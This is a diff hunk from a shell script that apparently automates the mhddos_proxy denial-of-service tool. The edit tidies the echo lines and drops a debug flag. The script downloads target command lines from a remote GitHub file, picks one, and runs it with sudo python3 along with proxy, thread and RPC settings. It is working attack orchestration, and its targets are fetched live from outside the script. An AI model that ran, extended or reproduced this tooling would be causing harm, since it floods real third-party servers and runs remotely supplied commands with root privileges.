@@ -62,14 +62,12 @@ do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
            
-            echo "command line"
-            echo "$cmd_line"
-            echo "full cmd"
-            
-            echo "$proxy_interval $threads $rpc"
+
+            echo "full cmd:"
+            echo "$cmd_line $proxy_interval $threads $rpc"
             
             cd ~/mhddos_proxy
-            sudo python3 -d $cmd_line $proxy_interval $rpc
+            sudo python3 $cmd_line $proxy_interval $rpc
    done
    
    echo -e "#####################################\n"
